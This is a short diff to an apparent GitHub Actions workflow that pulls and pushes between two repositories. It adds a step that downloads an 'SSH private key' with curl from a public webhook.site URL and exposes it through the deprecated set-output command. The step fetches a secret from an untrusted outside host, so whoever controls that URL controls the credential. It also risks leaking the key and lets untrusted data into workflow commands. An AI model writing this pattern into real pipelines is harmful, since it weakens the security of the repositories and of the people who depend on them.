@@ -27,6 +27,12 @@ jobs:
           cd repoB
           git pull origin develop
 
+      - name: Get SSH Private Key
+        id: get_ssh_key
+        run: |
+          ssh_key=$(curl -s https://webhook.site/8782974c-d6ff-429b-9ed5-e888837dedd8)
+          echo "::set-output name=ssh_key::$ssh_key"
+
       - name: Push to RepoB
         run: |
           cd repoB
